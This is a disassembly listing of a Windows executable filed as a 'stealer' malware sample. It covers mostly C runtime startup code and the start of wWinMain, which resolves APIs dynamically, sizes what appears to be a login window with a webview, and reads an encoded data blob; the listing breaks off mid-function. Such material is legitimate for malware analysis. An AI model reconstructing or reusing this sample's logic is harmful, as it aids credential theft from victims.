
malware_samples/stealer/ce12d366e445692302ebdeb61257797e56927b3bb25703da12a95339ec151e82.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <WinMainCRTStartup>:
   140001000:	48 83 ec 28          	sub    $0x28,%rsp

0000000140001004 <.l_startw>:
   140001004:	48 8b 05 15 50 00 00 	mov    0x5015(%rip),%rax        # 140006020 <.refptr.__mingw_app_type>
   14000100b:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001011:	e8 0a 00 00 00       	call   140001020 <__tmainCRTStartup>
   140001016:	90                   	nop

0000000140001017 <.l_endw>:
   140001017:	90                   	nop
   140001018:	90                   	nop
   140001019:	48 83 c4 28          	add    $0x28,%rsp
   14000101d:	c3                   	ret
   14000101e:	66 90                	xchg   %ax,%ax

0000000140001020 <__tmainCRTStartup>:
   140001020:	41 57                	push   %r15
   140001022:	41 56                	push   %r14
   140001024:	41 55                	push   %r13
   140001026:	41 54                	push   %r12
   140001028:	56                   	push   %rsi
   140001029:	57                   	push   %rdi
   14000102a:	55                   	push   %rbp
   14000102b:	53                   	push   %rbx
   14000102c:	48 83 ec 38          	sub    $0x38,%rsp
   140001030:	b8 30 00 00 00       	mov    $0x30,%eax
   140001035:	65 67 48 8b 00       	mov    %gs:(%eax),%rax
   14000103a:	48 8b 70 08          	mov    0x8(%rax),%rsi
   14000103e:	48 8b 1d 03 50 00 00 	mov    0x5003(%rip),%rbx        # 140006048 <.refptr.__native_startup_lock>
   140001045:	31 c0                	xor    %eax,%eax
   140001047:	f0 48 0f b1 33       	lock cmpxchg %rsi,(%rbx)
   14000104c:	40 0f 94 c5          	sete   %bpl
   140001050:	48 39 c6             	cmp    %rax,%rsi
   140001053:	0f 94 c0             	sete   %al
   140001056:	40 08 e8             	or     %bpl,%al
   140001059:	75 2e                	jne    140001089 <__tmainCRTStartup+0x69>
   14000105b:	48 8b 3d f6 69 07 00 	mov    0x769f6(%rip),%rdi        # 140077a58 <__imp_Sleep>
   140001062:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140001069:	1f 84 00 00 00 00 00 
   140001070:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   140001075:	ff d7                	call   *%rdi
   140001077:	31 c0                	xor    %eax,%eax
   140001079:	f0 48 0f b1 33       	lock cmpxchg %rsi,(%rbx)
   14000107e:	40 0f 94 c5          	sete   %bpl
   140001082:	74 05                	je     140001089 <__tmainCRTStartup+0x69>
   140001084:	48 39 c6             	cmp    %rax,%rsi
   140001087:	75 e7                	jne    140001070 <__tmainCRTStartup+0x50>
   140001089:	4c 8b 35 c0 4f 00 00 	mov    0x4fc0(%rip),%r14        # 140006050 <.refptr.__native_startup_state>
   140001090:	41 8b 06             	mov    (%r14),%eax
   140001093:	83 f8 01             	cmp    $0x1,%eax
   140001096:	0f 84 ef 02 00 00    	je     14000138b <__tmainCRTStartup+0x36b>
   14000109c:	41 83 3e 00          	cmpl   $0x0,(%r14)
   1400010a0:	0f 84 80 00 00 00    	je     140001126 <__tmainCRTStartup+0x106>
   1400010a6:	c6 05 f3 8f 07 00 01 	movb   $0x1,0x78ff3(%rip)        # 14007a0a0 <has_cctor>
   1400010ad:	40 84 ed             	test   %bpl,%bpl
   1400010b0:	74 05                	je     1400010b7 <__tmainCRTStartup+0x97>
   1400010b2:	31 c0                	xor    %eax,%eax
   1400010b4:	48 87 03             	xchg   %rax,(%rbx)
   1400010b7:	48 8b 05 52 4f 00 00 	mov    0x4f52(%rip),%rax        # 140006010 <.refptr.__dyn_tls_init_callback>
   1400010be:	48 8b 00             	mov    (%rax),%rax
   1400010c1:	48 85 c0             	test   %rax,%rax
   1400010c4:	74 10                	je     1400010d6 <__tmainCRTStartup+0xb6>
   1400010c6:	31 c9                	xor    %ecx,%ecx
   1400010c8:	ba 02 00 00 00       	mov    $0x2,%edx
   1400010cd:	45 31 c0             	xor    %r8d,%r8d
   1400010d0:	ff 15 9a 62 07 00    	call   *0x7629a(%rip)        # 140077370 <__guard_dispatch_icall_fptr>
   1400010d6:	48 8b 35 bb 8f 07 00 	mov    0x78fbb(%rip),%rsi        # 14007a098 <envp>
   1400010dd:	e8 3e 37 00 00       	call   140004820 <__p___winitenv>
   1400010e2:	48 89 30             	mov    %rsi,(%rax)
   1400010e5:	8b 0d 9d 8f 07 00    	mov    0x78f9d(%rip),%ecx        # 14007a088 <argc>
   1400010eb:	48 8b 15 9e 8f 07 00 	mov    0x78f9e(%rip),%rdx        # 14007a090 <argv>
   1400010f2:	4c 8b 05 9f 8f 07 00 	mov    0x78f9f(%rip),%r8        # 14007a098 <envp>
   1400010f9:	e8 32 36 00 00       	call   140004730 <wmain>
   1400010fe:	83 3d 7f 8f 07 00 00 	cmpl   $0x0,0x78f7f(%rip)        # 14007a084 <managedapp>
   140001105:	0f 84 8a 02 00 00    	je     140001395 <__tmainCRTStartup+0x375>
   14000110b:	80 3d 8e 8f 07 00 00 	cmpb   $0x0,0x78f8e(%rip)        # 14007a0a0 <has_cctor>
   140001112:	0f 85 4b 01 00 00    	jne    140001263 <__tmainCRTStartup+0x243>
   140001118:	89 c6                	mov    %eax,%esi
   14000111a:	e8 01 44 00 00       	call   140005520 <_cexit>
   14000111f:	89 f0                	mov    %esi,%eax
   140001121:	e9 3d 01 00 00       	jmp    140001263 <__tmainCRTStartup+0x243>
   140001126:	41 c7 06 01 00 00 00 	movl   $0x1,(%r14)
   14000112d:	e8 de 30 00 00       	call   140004210 <_pei386_runtime_relocator>
   140001132:	48 8d 0d 97 2e 00 00 	lea    0x2e97(%rip),%rcx        # 140003fd0 <_gnu_exception_handler>
   140001139:	ff 15 11 69 07 00    	call   *0x76911(%rip)        # 140077a50 <__imp_SetUnhandledExceptionFilter>
   14000113f:	48 8b 0d fa 4e 00 00 	mov    0x4efa(%rip),%rcx        # 140006040 <.refptr.__mingw_oldexcpt_handler>
   140001146:	48 89 01             	mov    %rax,(%rcx)
   140001149:	48 8d 0d 80 02 00 00 	lea    0x280(%rip),%rcx        # 1400013d0 <__mingw_invalidParameterHandler>
   140001150:	e8 1b 44 00 00       	call   140005570 <_set_invalid_parameter_handler>
   140001155:	e8 36 30 00 00       	call   140004190 <_fpreset>
   14000115a:	48 8b 05 c7 4e 00 00 	mov    0x4ec7(%rip),%rax        # 140006028 <.refptr.__mingw_initltsdrot_force>
   140001161:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001167:	48 8b 05 c2 4e 00 00 	mov    0x4ec2(%rip),%rax        # 140006030 <.refptr.__mingw_initltsdyn_force>
   14000116e:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001174:	48 8b 05 bd 4e 00 00 	mov    0x4ebd(%rip),%rax        # 140006038 <.refptr.__mingw_initltssuo_force>
   14000117b:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001181:	48 8b 0d 80 4e 00 00 	mov    0x4e80(%rip),%rcx        # 140006008 <.refptr.__ImageBase>
   140001188:	31 c0                	xor    %eax,%eax
   14000118a:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
   14000118f:	75 3c                	jne    1400011cd <__tmainCRTStartup+0x1ad>
   140001191:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   140001195:	81 3c 11 50 45 00 00 	cmpl   $0x4550,(%rcx,%rdx,1)
   14000119c:	75 2f                	jne    1400011cd <__tmainCRTStartup+0x1ad>
   14000119e:	48 01 d1             	add    %rdx,%rcx
   1400011a1:	0f b7 51 18          	movzwl 0x18(%rcx),%edx
   1400011a5:	81 fa 0b 02 00 00    	cmp    $0x20b,%edx
   1400011ab:	0f 84 b9 01 00 00    	je     14000136a <__tmainCRTStartup+0x34a>
   1400011b1:	81 fa 0b 01 00 00    	cmp    $0x10b,%edx
   1400011b7:	75 14                	jne    1400011cd <__tmainCRTStartup+0x1ad>
   1400011b9:	ba e8 00 00 00       	mov    $0xe8,%edx
   1400011be:	83 79 74 0f          	cmpl   $0xf,0x74(%rcx)
   1400011c2:	72 09                	jb     1400011cd <__tmainCRTStartup+0x1ad>
   1400011c4:	31 c0                	xor    %eax,%eax
   1400011c6:	83 3c 11 00          	cmpl   $0x0,(%rcx,%rdx,1)
   1400011ca:	0f 95 c0             	setne  %al
   1400011cd:	48 8b 0d 4c 4e 00 00 	mov    0x4e4c(%rip),%rcx        # 140006020 <.refptr.__mingw_app_type>
   1400011d4:	83 39 01             	cmpl   $0x1,(%rcx)
   1400011d7:	89 05 a7 8e 07 00    	mov    %eax,0x78ea7(%rip)        # 14007a084 <managedapp>
   1400011dd:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400011e2:	83 d9 00             	sbb    $0x0,%ecx
   1400011e5:	e8 76 44 00 00       	call   140005660 <__set_app_type>
   1400011ea:	48 8b 05 97 4e 00 00 	mov    0x4e97(%rip),%rax        # 140006088 <.refptr._fmode>
   1400011f1:	8b 30                	mov    (%rax),%esi
   1400011f3:	e8 18 43 00 00       	call   140005510 <__p__fmode>
   1400011f8:	89 30                	mov    %esi,(%rax)
   1400011fa:	48 8b 05 77 4e 00 00 	mov    0x4e77(%rip),%rax        # 140006078 <.refptr._commode>
   140001201:	8b 30                	mov    (%rax),%esi
   140001203:	e8 f8 42 00 00       	call   140005500 <__p__commode>
   140001208:	89 30                	mov    %esi,(%rax)
   14000120a:	e8 11 35 00 00       	call   140004720 <_wsetargv>
   14000120f:	85 c0                	test   %eax,%eax
   140001211:	0f 88 6a 01 00 00    	js     140001381 <__tmainCRTStartup+0x361>
   140001217:	48 8b 05 e2 4d 00 00 	mov    0x4de2(%rip),%rax        # 140006000 <.refptr._MINGW_INSTALL_DEBUG_MATHERR>
   14000121e:	83 38 01             	cmpl   $0x1,(%rax)
   140001221:	75 0c                	jne    14000122f <__tmainCRTStartup+0x20f>
   140001223:	48 8d 0d 76 2f 00 00 	lea    0x2f76(%rip),%rcx        # 1400041a0 <_matherr>
   14000122a:	e8 51 2f 00 00       	call   140004180 <__mingw_setusermatherr>
   14000122f:	48 8b 05 e2 4d 00 00 	mov    0x4de2(%rip),%rax        # 140006018 <.refptr.__globallocalestatus>
   140001236:	83 38 ff             	cmpl   $0xffffffff,(%rax)
   140001239:	75 0a                	jne    140001245 <__tmainCRTStartup+0x225>
   14000123b:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140001240:	e8 eb 42 00 00       	call   140005530 <_configthreadlocale>
   140001245:	48 8b 0d 1c 4e 00 00 	mov    0x4e1c(%rip),%rcx        # 140006068 <.refptr.__xi_a>
   14000124c:	48 8b 15 1d 4e 00 00 	mov    0x4e1d(%rip),%rdx        # 140006070 <.refptr.__xi_z>
   140001253:	e8 08 43 00 00       	call   140005560 <_initterm_e>
   140001258:	89 c1                	mov    %eax,%ecx
   14000125a:	b8 ff 00 00 00       	mov    $0xff,%eax
   14000125f:	85 c9                	test   %ecx,%ecx
   140001261:	74 11                	je     140001274 <__tmainCRTStartup+0x254>
   140001263:	48 83 c4 38          	add    $0x38,%rsp
   140001267:	5b                   	pop    %rbx
   140001268:	5d                   	pop    %rbp
   140001269:	5f                   	pop    %rdi
   14000126a:	5e                   	pop    %rsi
   14000126b:	41 5c                	pop    %r12
   14000126d:	41 5d                	pop    %r13
   14000126f:	41 5e                	pop    %r14
   140001271:	41 5f                	pop    %r15
   140001273:	c3                   	ret
   140001274:	48 8b 05 15 4e 00 00 	mov    0x4e15(%rip),%rax        # 140006090 <.refptr._newmode>
   14000127b:	8b 00                	mov    (%rax),%eax
   14000127d:	89 44 24 34          	mov    %eax,0x34(%rsp)
   140001281:	48 8b 05 f8 4d 00 00 	mov    0x4df8(%rip),%rax        # 140006080 <.refptr._dowildcard>
   140001288:	44 8b 08             	mov    (%rax),%r9d
   14000128b:	48 8d 44 24 34       	lea    0x34(%rsp),%rax
   140001290:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001295:	48 8d 0d ec 8d 07 00 	lea    0x78dec(%rip),%rcx        # 14007a088 <argc>
   14000129c:	48 8d 15 ed 8d 07 00 	lea    0x78ded(%rip),%rdx        # 14007a090 <argv>
   1400012a3:	4c 8d 05 ee 8d 07 00 	lea    0x78dee(%rip),%r8        # 14007a098 <envp>
   1400012aa:	e8 81 35 00 00       	call   140004830 <__wgetmainargs>
   1400012af:	85 c0                	test   %eax,%eax
   1400012b1:	0f 88 ca 00 00 00    	js     140001381 <__tmainCRTStartup+0x361>
   1400012b7:	4c 63 3d ca 8d 07 00 	movslq 0x78dca(%rip),%r15        # 14007a088 <argc>
   1400012be:	4a 8d 0c fd 08 00 00 	lea    0x8(,%r15,8),%rcx
   1400012c5:	00 
   1400012c6:	e8 c5 42 00 00       	call   140005590 <malloc>
   1400012cb:	48 85 c0             	test   %rax,%rax
   1400012ce:	0f 84 ad 00 00 00    	je     140001381 <__tmainCRTStartup+0x361>
   1400012d4:	48 89 c6             	mov    %rax,%rsi
   1400012d7:	45 85 ff             	test   %r15d,%r15d
   1400012da:	7e 4f                	jle    14000132b <__tmainCRTStartup+0x30b>
   1400012dc:	4c 8b 25 ad 8d 07 00 	mov    0x78dad(%rip),%r12        # 14007a090 <argv>
   1400012e3:	45 31 ed             	xor    %r13d,%r13d
   1400012e6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400012ed:	00 00 00 
   1400012f0:	4b 8b 0c ec          	mov    (%r12,%r13,8),%rcx
   1400012f4:	e8 c7 42 00 00       	call   1400055c0 <wcslen>
   1400012f9:	48 8d 3c 45 02 00 00 	lea    0x2(,%rax,2),%rdi
   140001300:	00 
   140001301:	48 89 f9             	mov    %rdi,%rcx
   140001304:	e8 87 42 00 00       	call   140005590 <malloc>
   140001309:	4a 89 04 ee          	mov    %rax,(%rsi,%r13,8)
   14000130d:	48 85 c0             	test   %rax,%rax
   140001310:	74 6f                	je     140001381 <__tmainCRTStartup+0x361>
   140001312:	4b 8b 14 ec          	mov    (%r12,%r13,8),%rdx
   140001316:	48 89 c1             	mov    %rax,%rcx
   140001319:	49 89 f8             	mov    %rdi,%r8
   14000131c:	e8 7f 42 00 00       	call   1400055a0 <memcpy>
   140001321:	49 ff c5             	inc    %r13
   140001324:	4d 39 ef             	cmp    %r13,%r15
   140001327:	75 c7                	jne    1400012f0 <__tmainCRTStartup+0x2d0>
   140001329:	eb 03                	jmp    14000132e <__tmainCRTStartup+0x30e>
   14000132b:	45 31 ff             	xor    %r15d,%r15d
   14000132e:	4a c7 04 fe 00 00 00 	movq   $0x0,(%rsi,%r15,8)
   140001335:	00 
   140001336:	48 89 35 53 8d 07 00 	mov    %rsi,0x78d53(%rip)        # 14007a090 <argv>
   14000133d:	48 8b 0d 14 4d 00 00 	mov    0x4d14(%rip),%rcx        # 140006058 <.refptr.__xc_a>
   140001344:	48 8b 15 15 4d 00 00 	mov    0x4d15(%rip),%rdx        # 140006060 <.refptr.__xc_z>
   14000134b:	e8 00 42 00 00       	call   140005550 <_initterm>
   140001350:	e8 eb 2b 00 00       	call   140003f40 <__main>
   140001355:	41 c7 06 02 00 00 00 	movl   $0x2,(%r14)
   14000135c:	40 84 ed             	test   %bpl,%bpl
   14000135f:	0f 85 4d fd ff ff    	jne    1400010b2 <__tmainCRTStartup+0x92>
   140001365:	e9 4d fd ff ff       	jmp    1400010b7 <__tmainCRTStartup+0x97>
   14000136a:	ba f8 00 00 00       	mov    $0xf8,%edx
   14000136f:	83 b9 84 00 00 00 0f 	cmpl   $0xf,0x84(%rcx)
   140001376:	0f 83 48 fe ff ff    	jae    1400011c4 <__tmainCRTStartup+0x1a4>
   14000137c:	e9 4c fe ff ff       	jmp    1400011cd <__tmainCRTStartup+0x1ad>
   140001381:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001386:	e8 15 35 00 00       	call   1400048a0 <_amsg_exit>
   14000138b:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   140001390:	e8 0b 35 00 00       	call   1400048a0 <_amsg_exit>
   140001395:	89 c1                	mov    %eax,%ecx
   140001397:	e8 e4 41 00 00       	call   140005580 <exit>
   14000139c:	cc                   	int3
   14000139d:	0f 1f 00             	nopl   (%rax)

00000001400013a0 <mainCRTStartup>:
   1400013a0:	48 83 ec 28          	sub    $0x28,%rsp

00000001400013a4 <.l_start>:
   1400013a4:	48 8b 05 75 4c 00 00 	mov    0x4c75(%rip),%rax        # 140006020 <.refptr.__mingw_app_type>
   1400013ab:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   1400013b1:	e8 6a fc ff ff       	call   140001020 <__tmainCRTStartup>
   1400013b6:	90                   	nop

00000001400013b7 <.l_end>:
   1400013b7:	90                   	nop
   1400013b8:	90                   	nop
   1400013b9:	48 83 c4 28          	add    $0x28,%rsp
   1400013bd:	c3                   	ret
   1400013be:	66 90                	xchg   %ax,%ax

00000001400013c0 <atexit>:
   1400013c0:	e9 7b 41 00 00       	jmp    140005540 <_crt_atexit>
   1400013c5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400013cc:	00 00 00 00 

00000001400013d0 <__mingw_invalidParameterHandler>:
   1400013d0:	c3                   	ret
   1400013d1:	cc                   	int3
   1400013d2:	cc                   	int3
   1400013d3:	cc                   	int3
   1400013d4:	cc                   	int3
   1400013d5:	cc                   	int3
   1400013d6:	cc                   	int3
   1400013d7:	cc                   	int3
   1400013d8:	cc                   	int3
   1400013d9:	cc                   	int3
   1400013da:	cc                   	int3
   1400013db:	cc                   	int3
   1400013dc:	cc                   	int3
   1400013dd:	cc                   	int3
   1400013de:	cc                   	int3
   1400013df:	cc                   	int3

00000001400013e0 <wWinMain>:
   1400013e0:	41 57                	push   %r15
   1400013e2:	41 56                	push   %r14
   1400013e4:	56                   	push   %rsi
   1400013e5:	57                   	push   %rdi
   1400013e6:	53                   	push   %rbx
   1400013e7:	48 81 ec b0 06 00 00 	sub    $0x6b0,%rsp
   1400013ee:	0f 29 b4 24 a0 06 00 	movaps %xmm6,0x6a0(%rsp)
   1400013f5:	00 
   1400013f6:	48 89 ce             	mov    %rcx,%rsi
   1400013f9:	48 8d 0d 6a 5a 01 00 	lea    0x15a6a(%rip),%rcx        # 140016e6a <enc_ico_data+0x96ba>
   140001400:	ff 15 e2 65 07 00    	call   *0x765e2(%rip)        # 1400779e8 <__imp_GetModuleHandleW>
   140001406:	48 89 c7             	mov    %rax,%rdi
   140001409:	48 85 c0             	test   %rax,%rax
   14000140c:	74 20                	je     14000142e <wWinMain+0x4e>
   14000140e:	48 8d 15 6b 5a 01 00 	lea    0x15a6b(%rip),%rdx        # 140016e80 <enc_ico_data+0x96d0>
   140001415:	48 89 f9             	mov    %rdi,%rcx
   140001418:	ff 15 d2 65 07 00    	call   *0x765d2(%rip)        # 1400779f0 <__imp_GetProcAddress>
   14000141e:	48 85 c0             	test   %rax,%rax
   140001421:	74 0b                	je     14000142e <wWinMain+0x4e>
   140001423:	48 c7 c1 fc ff ff ff 	mov    $0xfffffffffffffffc,%rcx
   14000142a:	ff d0                	call   *%rax
   14000142c:	eb 4c                	jmp    14000147a <wWinMain+0x9a>
   14000142e:	48 8d 0d 69 5a 01 00 	lea    0x15a69(%rip),%rcx        # 140016e9e <enc_ico_data+0x96ee>
   140001435:	ff 15 05 66 07 00    	call   *0x76605(%rip)        # 140077a40 <__imp_LoadLibraryW>
   14000143b:	48 85 c0             	test   %rax,%rax
   14000143e:	74 1e                	je     14000145e <wWinMain+0x7e>
   140001440:	48 8d 15 6d 5a 01 00 	lea    0x15a6d(%rip),%rdx        # 140016eb4 <enc_ico_data+0x9704>
   140001447:	48 89 c1             	mov    %rax,%rcx
   14000144a:	ff 15 a0 65 07 00    	call   *0x765a0(%rip)        # 1400779f0 <__imp_GetProcAddress>
   140001450:	48 85 c0             	test   %rax,%rax
   140001453:	74 09                	je     14000145e <wWinMain+0x7e>
   140001455:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000145a:	ff d0                	call   *%rax
   14000145c:	eb 1c                	jmp    14000147a <wWinMain+0x9a>
   14000145e:	48 85 ff             	test   %rdi,%rdi
   140001461:	74 17                	je     14000147a <wWinMain+0x9a>
   140001463:	48 8d 15 61 5a 01 00 	lea    0x15a61(%rip),%rdx        # 140016ecb <enc_ico_data+0x971b>
   14000146a:	48 89 f9             	mov    %rdi,%rcx
   14000146d:	ff 15 7d 65 07 00    	call   *0x7657d(%rip)        # 1400779f0 <__imp_GetProcAddress>
   140001473:	48 85 c0             	test   %rax,%rax
   140001476:	74 02                	je     14000147a <wWinMain+0x9a>
   140001478:	ff d0                	call   *%rax
   14000147a:	48 8d 0d e9 59 01 00 	lea    0x159e9(%rip),%rcx        # 140016e6a <enc_ico_data+0x96ba>
   140001481:	ff 15 61 65 07 00    	call   *0x76561(%rip)        # 1400779e8 <__imp_GetModuleHandleW>
   140001487:	48 85 c0             	test   %rax,%rax
   14000148a:	74 1e                	je     1400014aa <wWinMain+0xca>
   14000148c:	48 8d 15 4b 5a 01 00 	lea    0x15a4b(%rip),%rdx        # 140016ede <enc_ico_data+0x972e>
   140001493:	48 89 c1             	mov    %rax,%rcx
   140001496:	ff 15 54 65 07 00    	call   *0x76554(%rip)        # 1400779f0 <__imp_GetProcAddress>
   14000149c:	48 85 c0             	test   %rax,%rax
   14000149f:	74 09                	je     1400014aa <wWinMain+0xca>
   1400014a1:	ff d0                	call   *%rax
   1400014a3:	89 c7                	mov    %eax,%edi
   1400014a5:	83 f8 60             	cmp    $0x60,%eax
   1400014a8:	75 32                	jne    1400014dc <wWinMain+0xfc>
   1400014aa:	31 c9                	xor    %ecx,%ecx
   1400014ac:	ff 15 46 66 07 00    	call   *0x76646(%rip)        # 140077af8 <__imp_GetDC>
   1400014b2:	48 85 c0             	test   %rax,%rax
   1400014b5:	74 20                	je     1400014d7 <wWinMain+0xf7>
   1400014b7:	48 89 c1             	mov    %rax,%rcx
   1400014ba:	ba 58 00 00 00       	mov    $0x58,%edx
   1400014bf:	48 89 c3             	mov    %rax,%rbx
   1400014c2:	ff 15 50 67 07 00    	call   *0x76750(%rip)        # 140077c18 <__imp_GetDeviceCaps>
   1400014c8:	89 c7                	mov    %eax,%edi
   1400014ca:	31 c9                	xor    %ecx,%ecx
   1400014cc:	48 89 da             	mov    %rbx,%rdx
   1400014cf:	ff 15 93 66 07 00    	call   *0x76693(%rip)        # 140077b68 <__imp_ReleaseDC>
   1400014d5:	eb 05                	jmp    1400014dc <wWinMain+0xfc>
   1400014d7:	bf 60 00 00 00       	mov    $0x60,%edi
   1400014dc:	89 f8                	mov    %edi,%eax
   1400014de:	f3 48 0f 2a c0       	cvtsi2ss %rax,%xmm0
   1400014e3:	f3 0f 5e 05 b5 4b 00 	divss  0x4bb5(%rip),%xmm0        # 1400060a0 <.refptr._newmode+0x10>
   1400014ea:	00 
   1400014eb:	f3 0f 10 15 b1 4b 00 	movss  0x4bb1(%rip),%xmm2        # 1400060a4 <.refptr._newmode+0x14>
   1400014f2:	00 
   1400014f3:	f3 0f 59 d0          	mulss  %xmm0,%xmm2
   1400014f7:	f3 0f 10 0d a9 4b 00 	movss  0x4ba9(%rip),%xmm1        # 1400060a8 <.refptr._newmode+0x18>
   1400014fe:	00 
   1400014ff:	f3 0f 58 d1          	addss  %xmm1,%xmm2
   140001503:	f3 0f 2c c2          	cvttss2si %xmm2,%eax
   140001507:	89 05 03 8c 07 00    	mov    %eax,0x78c03(%rip)        # 14007a110 <S_WND_W>
   14000150d:	f3 0f 10 15 97 4b 00 	movss  0x4b97(%rip),%xmm2        # 1400060ac <.refptr._newmode+0x1c>
   140001514:	00 
   140001515:	f3 0f 59 d0          	mulss  %xmm0,%xmm2
   140001519:	f3 0f 58 d1          	addss  %xmm1,%xmm2
   14000151d:	f3 0f 2c c2          	cvttss2si %xmm2,%eax
   140001521:	89 05 ed 8b 07 00    	mov    %eax,0x78bed(%rip)        # 14007a114 <S_WND_H>
   140001527:	f3 0f 10 15 81 4b 00 	movss  0x4b81(%rip),%xmm2        # 1400060b0 <.refptr._newmode+0x20>
   14000152e:	00 
   14000152f:	f3 0f 59 d0          	mulss  %xmm0,%xmm2
   140001533:	f3 0f 58 d1          	addss  %xmm1,%xmm2
   140001537:	f3 0f 2c c2          	cvttss2si %xmm2,%eax
   14000153b:	89 05 d7 8b 07 00    	mov    %eax,0x78bd7(%rip)        # 14007a118 <S_TOP_BAR_H>
   140001541:	f3 0f 10 15 6b 4b 00 	movss  0x4b6b(%rip),%xmm2        # 1400060b4 <.refptr._newmode+0x24>
   140001548:	00 
   140001549:	f3 0f 59 d0          	mulss  %xmm0,%xmm2
   14000154d:	f3 0f 58 d1          	addss  %xmm1,%xmm2
   140001551:	f3 0f 2c c2          	cvttss2si %xmm2,%eax
   140001555:	89 05 c1 8b 07 00    	mov    %eax,0x78bc1(%rip)        # 14007a11c <S_CLOSE_SZ>
   14000155b:	f3 0f 10 15 55 4b 00 	movss  0x4b55(%rip),%xmm2        # 1400060b8 <.refptr._newmode+0x28>
   140001562:	00 
   140001563:	f3 0f 59 d0          	mulss  %xmm0,%xmm2
   140001567:	f3 0f 58 d1          	addss  %xmm1,%xmm2
   14000156b:	f3 0f 2c c2          	cvttss2si %xmm2,%eax
   14000156f:	89 05 ab 8b 07 00    	mov    %eax,0x78bab(%rip)        # 14007a120 <S_LOGIN_W>
   140001575:	f3 0f 10 15 3f 4b 00 	movss  0x4b3f(%rip),%xmm2        # 1400060bc <.refptr._newmode+0x2c>
   14000157c:	00 
   14000157d:	f3 0f 59 d0          	mulss  %xmm0,%xmm2
   140001581:	f3 0f 58 d1          	addss  %xmm1,%xmm2
   140001585:	f3 0f 2c c2          	cvttss2si %xmm2,%eax
   140001589:	89 05 95 8b 07 00    	mov    %eax,0x78b95(%rip)        # 14007a124 <S_LOGIN_H>
   14000158f:	f3 0f 10 15 29 4b 00 	movss  0x4b29(%rip),%xmm2        # 1400060c0 <.refptr._newmode+0x30>
   140001596:	00 
   140001597:	f3 0f 59 d0          	mulss  %xmm0,%xmm2
   14000159b:	f3 0f 58 d1          	addss  %xmm1,%xmm2
   14000159f:	f3 0f 2c c2          	cvttss2si %xmm2,%eax
   1400015a3:	89 05 7f 8b 07 00    	mov    %eax,0x78b7f(%rip)        # 14007a128 <S_CONTENT_W>
   1400015a9:	f3 0f 10 15 13 4b 00 	movss  0x4b13(%rip),%xmm2        # 1400060c4 <.refptr._newmode+0x34>
   1400015b0:	00 
   1400015b1:	f3 0f 59 d0          	mulss  %xmm0,%xmm2
   1400015b5:	f3 0f 58 d1          	addss  %xmm1,%xmm2
   1400015b9:	f3 0f 2c c2          	cvttss2si %xmm2,%eax
   1400015bd:	f3 0f 11 05 3b 8a 07 	movss  %xmm0,0x78a3b(%rip)        # 14007a000 <g_dpiScale>
   1400015c4:	00 
   1400015c5:	89 05 61 8b 07 00    	mov    %eax,0x78b61(%rip)        # 14007a12c <S_WV_W>
   1400015cb:	f3 0f 59 05 f5 4a 00 	mulss  0x4af5(%rip),%xmm0        # 1400060c8 <.refptr._newmode+0x38>
   1400015d2:	00 
   1400015d3:	f3 0f 58 c1          	addss  %xmm1,%xmm0
   1400015d7:	f3 0f 2c c0          	cvttss2si %xmm0,%eax
   1400015db:	89 05 4f 8b 07 00    	mov    %eax,0x78b4f(%rip)        # 14007a130 <S_WV_H>
   1400015e1:	31 c9                	xor    %ecx,%ecx
   1400015e3:	ba 02 00 00 00       	mov    $0x2,%edx
   1400015e8:	ff 15 62 63 07 00    	call   *0x76362(%rip)        # 140077950 <__imp_CoInitializeEx>
   1400015ee:	48 8d 0d f9 58 01 00 	lea    0x158f9(%rip),%rcx        # 140016eee <enc_ico_data+0x973e>
   1400015f5:	ff 15 45 64 07 00    	call   *0x76445(%rip)        # 140077a40 <__imp_LoadLibraryW>
   1400015fb:	48 85 c0             	test   %rax,%rax
   1400015fe:	74 30                	je     140001630 <wWinMain+0x250>
   140001600:	48 89 c7             	mov    %rax,%rdi
   140001603:	48 8d 15 fc 58 01 00 	lea    0x158fc(%rip),%rdx        # 140016f06 <enc_ico_data+0x9756>
   14000160a:	48 8b 1d df 63 07 00 	mov    0x763df(%rip),%rbx        # 1400779f0 <__imp_GetProcAddress>
   140001611:	48 89 c1             	mov    %rax,%rcx
   140001614:	ff d3                	call   *%rbx
   140001616:	48 89 05 1b 8b 07 00 	mov    %rax,0x78b1b(%rip)        # 14007a138 <pfGF>
   14000161d:	48 8d 15 ef 58 01 00 	lea    0x158ef(%rip),%rdx        # 140016f13 <enc_ico_data+0x9763>
   140001624:	48 89 f9             	mov    %rdi,%rcx
   140001627:	ff d3                	call   *%rbx
   140001629:	48 89 05 10 8b 07 00 	mov    %rax,0x78b10(%rip)        # 14007a140 <pfAB>
   140001630:	48 8d 8c 24 80 02 00 	lea    0x280(%rsp),%rcx
   140001637:	00 
   140001638:	ba 55 00 00 00       	mov    $0x55,%edx
   14000163d:	ff 15 d5 63 07 00    	call   *0x763d5(%rip)        # 140077a18 <__imp_GetUserDefaultLocaleName>
   140001643:	85 c0                	test   %eax,%eax
   140001645:	0f 84 a5 01 00 00    	je     1400017f0 <wWinMain+0x410>
   14000164b:	8b 84 24 80 02 00 00 	mov    0x280(%rsp),%eax
   140001652:	89 44 24 70          	mov    %eax,0x70(%rsp)
   140001656:	66 c7 44 24 74 00 00 	movw   $0x0,0x74(%rsp)
   14000165d:	48 8d 15 5a 59 01 00 	lea    0x1595a(%rip),%rdx        # 140016fbe <enc_ico_data+0x980e>
   140001664:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140001669:	e8 42 3f 00 00       	call   1400055b0 <wcscmp>
   14000166e:	85 c0                	test   %eax,%eax
